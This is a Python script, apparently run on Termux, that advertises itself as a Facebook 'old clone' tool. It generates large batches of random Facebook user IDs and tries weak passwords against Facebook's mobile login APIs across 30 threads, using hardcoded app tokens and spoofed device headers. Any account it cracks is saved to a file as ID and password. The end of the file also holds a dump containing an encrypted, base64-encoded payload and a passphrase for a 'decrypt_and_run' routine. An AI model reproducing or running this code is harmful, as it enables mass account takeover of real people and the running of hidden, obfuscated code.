#  RIPON ALI
#  BANGLADESH
#  MANGO 
import os, sys, time, uuid, hashlib, random, requests, base64, subprocess
from concurrent.futures import ThreadPoolExecutor as tred
from random import randint as rr

# ---- BANNER ----
def banner():
    os.system('clear')
    print("\033[1;32m╔═════════════════════════════════════════════════════╗")
    print("\033[1;32m║🥭🥭  🥭🥭    🥭🥭    🥭🥭   🥭    🥭🥭🥭    🥭🥭🥭  ║\033[0m")
    print("\033[1;32m║🥭🥭  🥭🥭    🥭🥭    🥭🥭   🥭   🥭        🥭    🥭 ║\033[0m")
    print("\033[1;32m║🥭 🥭🥭 🥭   🥭  🥭   🥭 🥭  🥭  🥭   🥭🥭  🥭    🥭 ║\033[0m")
    print("\033[1;32m║🥭  🥭  🥭   🥭🥭🥭   🥭  🥭 🥭   🥭    🥭  🥭    🥭 ║\033[0m")
    print("\033[1;32m║🥭      🥭  🥭    🥭  🥭   🥭🥭    🥭🥭🥭    🥭🥭🥭  ║\033[0m")
    print("\033[1;32m╚═════════════════════════════════════════════════════╝\033[0m")
    print("\033[1;33m╔═════════════════════════════════════════════════╗")
    print("\033[1;33m║       🥭\033[1;32m WELCOME 🥭 MANGO 🥭 TOOLS 🥭           \033[1;33m║\033[0m")
    print("\033[1;33m╚═════════════════════════════════════════════════╝\033[0m")
    print("\033[1;33m╔═════════════════════════════════════════════╗\033[0m")
    print("\033[1;33m║\033[1;32m [\033[1;31m◑\033[1;32m] ADMIN      \033[1;36m☞  \033[1;32mMD RIPON ALI              \033[1;33m║\033[0m")
    print("\033[1;33m║\033[1;32m [\033[1;31m◑\033[1;32m] TYPE       \033[1;36m☞  \033[1;32mFB OLD CLONE              \033[1;33m║\033[0m")
    print("\033[1;33m║\033[1;32m [\033[1;31m◑\033[1;32m] CONTACT    \033[1;36m☞  \033[1;32m+8801642292127 (TG💬)     \033[1;33m║\033[0m")
    print("\033[1;33m╚═════════════════════════════════════════════╝\033[0m")
# ---- CONTACT & PRICE LIST ----
def show_info():
    print("\033[1;33m╔═════════════════════════════════════╗\033[0m")
    print("\033[1;33m║ \033[1;32m⚒️ TOOL NAME  \033[1;36m☞ \033[1;32mMANGO 🥭             \033[1;33m║\033[0m")
    print("\033[1;33m║ \033[1;32m✉️ CONTACT    \033[1;36m☞ \033[1;32m+8801642292127 (TG)  \033[1;33m║\033[0m")
    print("\033[1;33m╚═════════════════════════════════════╝\033[0m\n")
    


# ---- APPROVAL ----
def get_machine_key():
    raw = os.getlogin() + str(os.getuid()) + "MANGO2026"
    return "MANGO-" + hashlib.md5(raw.encode()).hexdigest().upper()[:12]

def check_approval(key):
    url = "https://raw.githubusercontent.com/rajavau379-pixel/Raja/refs/heads/main/Key.txt"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            keys = resp.text.strip().split('\n')
            return key in keys
        return False
    except:
        return False

def approval_flow():
    banner()
    show_info()
    key = get_machine_key()
    print("\033[1;37m🔑 YOUR UNIQUE KEY:\033[1;33m", key, "\033[0m")
    print("\033[1;37m📲 SEND THIS KEY TO WHATSAPP GROUP FOR APPROVAL\033[0m")
    print("\033[1;36m" + "─"*50 + "\033[0m")
    print("\033[1;32m[ A ] OPEN WHATSAPP GROUP\033[0m")
    print("\033[1;31m[ B ] CHECK APPROVAL\033[0m")
    print("\033[1;36m" + "─"*50 + "\033[0m")
    choice = input("\033[1;37mCHOOSE (A/B): \033[0m").strip().upper()
    if choice == 'A':
        open_whatsapp()
        time.sleep(2)
        approval_flow()
    elif choice == 'B':
        if check_approval(key):
            print("\033[1;32m✅ APPROVED! WELCOME TO MANGO CLONER\033[0m")
            time.sleep(1)
            return True
        else:
            print("\033[1;31m❌ NOT APPROVED – CONTACT ADMIN ON WHATSAPP\033[0m")
            print("\033[1;33m💡 Make sure admin has added your key to Key.txt\033[0m")
            time.sleep(3)
            approval_flow()
    else:
        approval_flow()

# ---- CREATION YEAR ----
def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')): return '2009'
        if uid.startswith(('1000006','1000007','1000008','1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002','100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005','100006')): return '2013'
        if uid.startswith(('100007','100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007','10008')): return '2022'
        return ''
    elif len(uid) in (9,10): return '2008'
    elif len(uid)==8: return '2007'
    elif len(uid)==7: return '2006'
    elif len(uid)==14 and uid.startswith('61'): return '2024'
    else: return ''

# ---- LOGIN FUNCTIONS ----
loop = 0
oks = []

def login_1(uid):
    global loop, oks
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mMANGO-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
        sys.stdout.flush()
        for pw in ('123456','1234567','12345678','123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mMANGO\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/MANGO-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMANGO-🥭\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/MANGO-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except:
        time.sleep(5)

def login_2(uid):
    global loop, oks
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMANGO-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    for pw in ('123456','123123','1234567','12345678','123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000,29999999)),
                    'x-fb-sim-hni': str(rr(20000,40000)),
                    'x-fb-net-hni': str(rr(20000,40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m<\x1b[38;5;196m(\x1b[1;37mMANGO-🥭\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/MANGO-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except:
            pass
    loop += 1

# ---- CLONING MENUS ----
def old_clone():
    banner()
    show_info()
    print('\033[1;36m' + '━'*50 + '\033[0m')
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m ALL SERIES')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m 100003/4 SERIES')
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m 2009 series')
    print('\033[1;36m' + '━'*50 + '\033[0m')
    choice = input("\033[1;37mCHOOSE (A/B/C): \033[0m").strip().upper()
    if choice == 'A':
        old_One()
    elif choice == 'B':
        old_Tow()
    elif choice == 'C':
        old_Tree()
    else:
        print("Invalid")
        old_clone()

def old_One():
    banner()
    print("\033[1;33m═════════════════════════════════════")
    print("\033[1;33m     OLD CODE 2010-2014 ")
    ask = input("\033[1;33m     SELECT         : ")
    limit = input("\033[1;33m     TOTAL ID COUNT : ")
    star = '10000'
    user = []
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 4999999999)))
        user.append(data)
    meth = input("\033[1;33m     METHOD (A/B)   : ").strip().upper()
    print("\033[1;33m═════════════════════════════════════")
    with tred(max_workers=30) as pool:
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tow():
    banner()
    limit = input("\033[1;33m     TOTAL ID COUNT : ")
    user = []
    for _ in range(int(limit)):
        prefix = random.choice(['100003','100004'])
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix+suffix)
    meth = input("\033[1;33m     METHOD (A/B)   : ").strip().upper()
    print("\033[1;33m═════════════════════════════════════")
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tree():
    banner()
    limit = input("\033[1;33m     TOTAL ID COUNT : ")
    user = []
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append('1000004'+suffix)
    meth = input("\033[1;33m     METHOD (A/B)   : ").strip().upper()
    print("\033[1;33m═════════════════════════════════════")
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def main_menu():
    #if approval_flow():
        banner()
        show_info()
        print('\033[1;32m[1] OLD CLONING\033[0m')
        print('\033[1;33m[2] EXIT\033[0m')
        ch = input("CHOOSE: ")
        if ch == '1':
            old_clone()
        else:
            sys.exit()

if __name__ == '__main__':
    main_menu()
# {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0xeb55a4f8>, '__spec__': None, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/data/data/com.termux/files/home/Raja/kamal.py', '__cached__': None, 'base64': <module 'base64' from '/data/data/com.termux/files/usr/lib/python3.14/base64.py'>, 'zlib': <module 'zlib' from '/data/data/com.termux/files/usr/lib/python3.14/lib-dynload/zlib.cpython-314-arm-linux-androideabi.so'>, 'os': <module 'os' (frozen)>, 'sys': <module 'sys' (built-in)>, 'time': <module 'time' (built-in)>, 'Fernet': <class 'cryptography.fernet.Fernet'>, 'hashes': <module 'cryptography.hazmat.primitives.hashes' from '/data/data/com.termux/files/usr/lib/python3.14/site-packages/cryptography/hazmat/primitives/hashes.py'>, 'PBKDF2HMAC': <class 'cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC'>, 'payload': 'Z0FBQUFBQnFvYmJLdW9mLS1vUVk2VXVyVFpRbXYwdmYyeXFyVEdINW15SDc3SXZfQ1NQNkdfQ1FGUVBtNzRXVVNVcGc5eGh1OWJwdDZXWWlwVHR5NHZJWnJ2cGY3QXp5c2RCRkZ0WWRyYnNSdHlCdjhKQm5rdFEtTWJYVVFNeG9kQjRPRjVxQlhxVTdEcDRleHExdGN2alZoSWUyMUVnTDJYSi1MVzEzOGlnOXpyc0pncXJFQzBZMUpBejlLOE5PTDA3RFd3TERNWVJvV25mRmtHb3ZQRWhaVXlsZ05aM01CU2hIUzBQRk9LcVRrZkNJdGtRN0RNeGZ1V1czSUItcExHVk8xZ0o5RmxNYUE1YUF1VkRLaE54VnhEZE1uUDgxWVBEMkVLYnZfSGRQWWVHRkI3QVNhU3R2MEUyNUZweW0wVVF5bXcwTUtlU1pzUVJTbmJPLWxVeDYzNmF1OFhwMExHbGpGekhVWk1saXlsdlNUT1BUZmcwcE1Cb2MzWDFlUVEtdjRBc1RPbEEyUEwtNVR4TFlWUHhCSUMzZnh4Y2VwTTNULXVkakVYSmcwdmNUaU4xTHI0UXhjSHloRlRnTURsYmZ6Zldzd0hsRVlOZ0h2S0ZmWEd1S0REREZqNi10NEx3alNHWnU4aE1jcGZKdmFfU0toajZQQ3piaHRpSjdWRmlfdFBwUmdkeThDOE5VdHd5VnJTLUR4NUJ3ZzVLYjYzbEVpZi11dG9hMDY4NzlvTkVraXJ1aWdpVHRrWjdIcDh3NEZoejFpQ1loMlRYRWtvaWlyTHFBU0xxVW9NdVU3eERrRWV2dFNRZFNQQlU2ZlZweFo0UkNHeDlNTDNMZWNrU0wzTDU5ODR6eDhrUnZLYnNRYjFUbEJ4U2RJN0QxUWRUU0VJUkI3NTlBQldkd3BSTWZWbDZ5RkRrLUdTN2UxMmpnTjF4WDJ3TkgzWjBjV25KMVJ1NUt1RTRuTjV1aXVKY05CWkVmM3ZVdVVNcy11TmJtT2xBbkhJTEZCUnBnYURjVmJ2UldPeThpMGlRS2xmSzYzM2xwbmxnQVZFTXJBQUJHS1AwUldIV055QlVSMDY0c3g2UkZ0LUZPZ2xCSVFzQ0l5RlNsV1hsYXN1ZUxnelJyQ1VTVWtiOWdEQUdxWWx3TnhRcEtHWVNfUVAyRUhFUl81WXVfc2MyQ1cwY09YcEhVUHJiYmpwRzNPQVFna0FvdkI5TVQ3QmhXWnNDbVhrSEFGTXphWDRpZ0N1cFh1cUhqa2FabkY5clVpWlltTktlTmVTMU1DTTlzQWFfaDRXbXJ0NTFOSExzYk9qVnB2Mi1WdDFkLWxGZTAzWlZmVFBBbUJfb2wzUjNWWmVZMVpvRWdhX01JZlBLTWlwVlEzSnNoVk1MN1BjS25QYlFpeEtHVEM2V2k1S0J4OGkzVDR2TE43a3RuTDZXLUd3R28wQVlrT05Sem1DX2syZlBJZ2xtczk0bG0zZi05Zmoycm1EUWgzM0h3MEtsVUpxd1R2UXRmSm40TVFWZmJTUzZ5YmtueE4xX3ZoejNkRzFTSkVsOUF1U0JCYS1kd3lyQjdXaXItTDVXT05fQXU0NjFoYjFCODRiUktGTUZob1QyeWFiT0JEU3UtT2cyaEZraDg3YTBibDJ3bWZfUlRBeUNqWXZPVGZMN29EenJENzZXWG9LeVJ1Mzhzb3l1aXhGRnh2aEtZTmpIQ01ob0p0UlJVZHZEMWRobGM5WDBIVXNJeFEyb1BYS21kVENabEFDdFVXYk5iamZzekROQ0VzQXVxb1MwQl91bnIyRTZDdkd0elotTHUwZDdpX0dWV1ktWmFuMGVCX2JiZmQxQmdwMUhRTW5zcWlxbXlKbE1ROXNDS2FwZzdHT2t5WE1aUERSOFhCdVFROHF4elhzcVExTEpoX3JsbDF0SzdBU2VHc21mS0d1T1M1X19uNEtBQ3NaUDBtYXM3OE43alhrSk0zQ0FvUWlFcmNOYTVDTldJMUQwQ3B6NGF2ek83VlNabDFndDM1RVV0bFVnbGR2V2IwTlVwRkJ5TWhxeEhQZlJiaF90UzAxTXJ1Y2ZrS3Y5bWlDLTJmMi1XZ19HQkF4WXJkUUVkbGYyQkY4Vk52b0c3c0hELVYzblV2bXNPNDFCZ21jV1lISi1mQXpDSXdhcnI3YnNnSkZiejczUTBNckNlQUlmZFRQNzdVSzVQakc5X3dleS1VX0oxME9SeTZad3M2NUN6UGh1VGYwLUpOSlctTGpYUXRfR3hiZUtmdTZPQmRkZUZ2TFJ0WnV0a3l1bDhETW14VnZCXzZseURJa0xEUWNQaUVMdFFvcnJXUlJsQWxhSVlEbVhyWDU1dEd4aHZMc0JwX2NaQi1KWjZCdExzbDJoZ0VnZS0wZ19Ka0V5LVFLVVVnZUlHSjJwOGwxUWR0Z3E5SFlmLVBUMy1XTkdFMEdWVEFKTHNOc3lJbDRGVzFBYlJOQjNwMDhaQ3FXb0ZOcFZFejN0WUxEOThTV0VEZDVDT2dJU05hV1h5ejZHRHVCWXZCV1g0bzlzX3ptb1Vsa0Fpb1B2elMtanhycGxjb3JGY2FETWVfV20yeGxYeGZ6UlBKX1Y5d280ZmFjS1p0VFlTakFuM2oyVUYtbXBTS2FmdGtSckszOFFrX0k0Z0k2WEFfOVNVeEtZX3djcno2ejh0NVhJTTlSb3FyYkdYdDE2MUxwRF9RbFN4OVE0Zi01bVBhWXRvT3ZfWjlfT1E1Ykl5Tm1IOVZNWnd0a2xNZzBaV05SX2I1cTVpeWc4eEVhR05PZ2trSlU3el9yYzJtbHdMRDlXeC1PSm42Y2NBbjdEYURjY3dpWkxIbDdUMHF5Zk1SUUVFd241T0RxWS1vdnJpczVYMUN1VjF2a1l6NmI2Nl9qMUtUcFp5WmFiM05FWlBsYW1zcFRJR1U2TXNpU3ByaS0zeXV0aFRISEFqNmU5VGNjc1pySHcxSThDMktJdGV5UFFyZlV0NXA5T0F5LWJJZnNDVUk2WkowVlRFWmJmSFZhQkZfNzhIRVcwckFSeDZRLWM5NVMxNVRSc18wRElfak1qOExzcWdfYTlTTlUyYTduX29QWWhKVEliMm1wYV9SRmhtWU15dmNyMTRWelFsTW1ZcUxLaEFlLWJZcmw1YV84eDlNV0h1MVRCb0lBakp0R0V3bFVzTXRFWHlITDBmeGMxUUhDb3l0OUJQOUZKbl9oYWRSUF9BQzhlYWxYN3R5OVdtcDMzb0dVOUw3Ynd6Nmp6WDZKcmZjc19UY3dxeWNna2NDTHVkck1sbUZjbEsxSFdSbTB6Tnl2SUhsUUNWR0NpbzRLUzlVWGptSW1vOXp4aFNITHMtNk9nRVFLcDMybHFocWFRNFRnVEFTRHM2NXB5ZVBZNklqbDZOaGE2X19tOTM2NUFlUVgtbV9rV2VCQTZjQWFYME5KUXE5NXlCdU80RS1hNGtkTVVmTHRxN3VoTDVIZmZQY1A3Y1hpaG04Y1Bvc3laVFlGMHg4YVRGMFVfbGp3TWRuOXdQdjlSUnFxTFotLU96Z2V0dTJSM2FnYlNqVWdoR1d0OVR4YWdXRzkxN3VPVk9uUnVTQlQ0RTJEUmFycHB4dkRRbmxOc19mQ2F0aVA4djhVOGxycEsyemtUZ0s0TEdibGFSSjNHeVdDa1ZSeEs1dEo5c0h6d1J4VEdLRWxMSk9RVWJYaXA0WThQc0N1bUdjNFpKMnVEZXJYV2UtTTUzT3doWGtVU2trYnFleXRwZjQ2SmxoN3Z5N3NQS3o3WUtIZVB1WmR6SkNnNzlDRVFqM3N6N2dZbi14NHJ2d25zT0FNME5TTGtaQUpYaGtKRlR2NmFRR0JPaXZ5S0xrZHpYSE1nX0lzbHlWZnFMdU9YV0RlTXlpb1lUdkNjUUNUSXFjU0tlVVFsbVRsZ3cwU256WHUzTFV3Tm5oV0RIYTNhb0F5cFhKWUNoR3JYLWZuUkNiWHJQcmNKRE80aUNCSXVBUnFfZWF5V3BweUNuQ3dkcnA5NndTU0VvMFdyM2k0bzRWNHBBeGdQLV9IWlZLbXd1b1NWY0NxbVVDS1N1a1dRY2JraFc1SmlhcWJ5QlFqMmxvTXMyb3Q5UDVsZWo5RnNQN25hVlBPNUNIWVFxc0lvTWtfU203MkpWR2ZSSUE3WG9WOWRxNVJRclhubUdVeUVZcHdHb0hGUmVGMXllVGx6akp6c1hBeVNvQVlzNG9zZ0VNY2JnNVNldi1NRnRuUjcxTUNWd0NFcks1ZC1GWGdIRzhNMVNGUmpjN3ptTUEwbU1FVFBTaFNRUXVVVjRWZ1VqUWoxa3dGYWlQUEd4UVdDeF9WaVBZN2VUeDNFcGlIVzZPbk5abHh3WlZFanZDWkJ5XzhFMFFDekd6UVVPSmNKT2NnTkpkY1dZaHA0ZVBEaWFsbndicXBKWmdIeEYyNTVrUTMwSzk0akpMSTFBVHVCVmU0THBzYUphWW9pRUprbl9sc1lnRVh2eFFCdzdQcXJ0SVFyc25mSk9WRHFqRlJwOFNxc01YUDlfTFpWMUpuazBCbm1DQ2YtS0x6dEpzUnhtNDBfWGd5SHJCRHVucmlNTU12UmtnVzFhNURJYzdpYnNHOWRWdVNxNzBFSWlGa2Z5R0xQVjBXTVc1a2Y5NTlxa2pjdzJXRDN1WGVMWjFOWXVxT3ZtbDFNSkNneW1feWgxdy0xaEtPN0U2Z1M1YjRMQXYybFRkM1djdWlPX2NOUlBUQ3FMeWE3ZHdtbTJaVFJsTmhRWG5kTWJHY2FtZERibXYxY2VwOEZDQURtckZQSTU5WFYtT2dXWlVaSjB2VnFkTkJhSm1UUGFHSTdCalM0TnJPXy05azAtQkdCRU1Vc2ZQckZJQXZYeDdyM29GbTdxM2NpTjktZ3BmMWY1NHJ6b0laMlQ4Z1dZbHFtZzJicjZoaUpHbG93OTUwYjdiaEc1QXJCeTBXUUhjVmpXR3NteV9lZmtjV2xTYjRrLUlNVllBeVcycEpaSENxUnlVdWgzZEtLVE1FTW9BeVRja1RhNTEwbXVOXzNhUkNkcWNpVTNac0pkVTlOQkV6RUJxSEx4R3dCYXdGcW1HbEx1U2lQaWZzY2RmYVZiYzlFSWFZR2JnT2REMWtoR2JtSzladXFuR1FqN0JBZGw4N3ZEczV5VXY1QTNHZnBEczdRdUd6SzJtSlJPRnBjdjV1amxncGpXOEZIY0J3MzBQNGhLTWgyV3NWY0F5OEZEbUxTVHQ3X0xySEpHazB1bVpKUWw5ZnF6b3lmdktJclY5dzF2b0MwYlRBT183S0o4R2tFM0UyTjRHRVVGUmRGSC1OM2F4dExHZGxZS3UtZEJxUXAtNTFETWRGUmdMcW5qVmtyTVhNalFuTEgwMFJOMV8tSFUyU0pKUDcxSkJDZkpiYm9LS3dRRDN4a2FfSE9aQWowTVFSbVE1TjlGYXBIbkgyWW1aMHoxaGE4NFU4S0puRDNUN2NvSWhxRVZ3aGFjTHY5eHV6NERTQktOY1pWT3BMWHBfZEdtRU51aC1uamwySEMxM1huMVpXcTZSQUdQNTNFZnVUZjJYNFY4TjRPOElOam9NSFVqQmVUMHliZ2poaF9rY1ctSEpPMEkyVEhCXzRheUk4WjlfeGNqbnR0WW1vYjBQQk42X184c3BiYm4tN3YxRXktVlo4T09KeFI2WlVlckE3aEc2Y0h5R29kbG1MSkNqYlZIaEVFTVhwQ2N1eUc2dk9zdVZlX2lBRW5obXFrUGZ5Y3JYekJFbEdEdzdrYVhvR3d6bmt6bS1LY0hfcC0zOVVRbkthbTM0aWxwb2FESTlXcGNxOHdOVW04cWxEdFlRV2NIWWlub3poM01idVFSWkZHeU1NbW9sTUFoc1ZnamJFaGR3dVhGR0xRQmo1NU9zd2lFNzdsRnRCTndkcnJiRmYtRWFxbXV3Slhfd2MzVFR1eWJ5YWJIeTQ4UHI2YVlLdWxnMm9ESGR2VF8tR3dXNkVRYVBoWnBXRW8weUdYQzU2ZUhQc3ladjduc3g4TUwxY0dFb2t3UWJlRkRGVGdPUVFTLUZUdnE5ZGd0SnJmQzZHOVVPWlo3ZXM5MnBBbGxoNEhkcnp0S3Z6elYwcnB5N0dNNFhwYzZ5YW9sSklZNS1tdkNrd3B6bkMwY3FpS19zOEJoMXZfQVVaZzItYXFjLWZSeUN2Rnd1MzFkUnNvdlNDWDZHTTB1ME5JRHVyNkhUa1l6UlQ0LXVNMVpEc1NiTVlWSDRVejVQQm1OeV9BS1ZwRXozVk5vSjZOQ2RydGF1OEx2ak8tekp5Znc1cV9Wek1EMHVvMmllOVJGd09uOXN5UDRMVjliVm1Yd1lJUFVFaWhfTERkaDZnbk9Qa2NwX0FpeTRoODN1QnRXSVJuZmNuVVBGSlF1dkN5eXptaFVGX0o4MTVGcHBhZV90TGd1dXRuWk9MWHBhNHl1QlowU1NER0VxYTMwcUJYWU5ISTUza3EyMWZLekZOSkNtRDVQVEpOTkkxbDAtWXl3cERObjZsRVUtUUZBaFZoUzV5dHBGOFJ0MHBSamMtRzhGcHFuZmVEcVloZS1qb0xNS3d3eG9sU3hnYnVDLVZXT2dTOWNxSktlTGF6V3ZhbzJXc0plZ3JDaEJmYVF5elZaa2tMNTN1UklIc0FUSGdoMDdDVHNTMjdKaVBvOUpOOWZTTTVRWkF1YmYwblpseTBJdGRlN2J2Y2lkZkNtcWNqc2xhazMxdWlMWTJpQ2ZuZHlLekZZdVBuNFJadklfVmJoZXpVR0V0TURvYzFUa2x5aWNpdm1EaWpwVnpHZXZVbWc0aTRCZ0JvUzg2a1pXZGpibTNSWXVKY28tR3l0MllnZVRqbXpSd3pqbl83bWY0a0QxUzNvUUxOMGNfaEoyOUlVeVRIS1cybmtqRFpFMl9HanFraUhpd0tWdmRYTFNfOWQ2OGxJdGpOekFmbmxXVDdCdFBVU01hUzZfUV9qNWc2VkZBZHhkVlRoZUVjdFYyT1hkSmNiaGx1NFh4dmh0cmdOOGl6ejhiS2JDSWdJVFQxYTByd19hd2h5ZHpWVURQU2djVWZuYlVwNk85WS1uMVJPUGpwSnNaenRwVFdCbmFYVjlVeVVGbExLYkNURmZTYmlWXzFzbnlRTl83ZjNLejV6VzVKMGk1ZmE4NW5M', 'salt_b64': 'VLHYGrZ6QXKaeGQk47rV6Q==', 'passphrase_b64': 'S0FNQUxfRU5DXzIwMjZfU0lSX1JPT0hVTEFNSU4=', 'f': <_io.TextIOWrapper name='/data/data/com.termux/files/home/Raja/kamal.py' mode='r' encoding='utf-8'>, 'decrypt_and_run': <function decrypt_and_run at 0xeb4d37b8>}
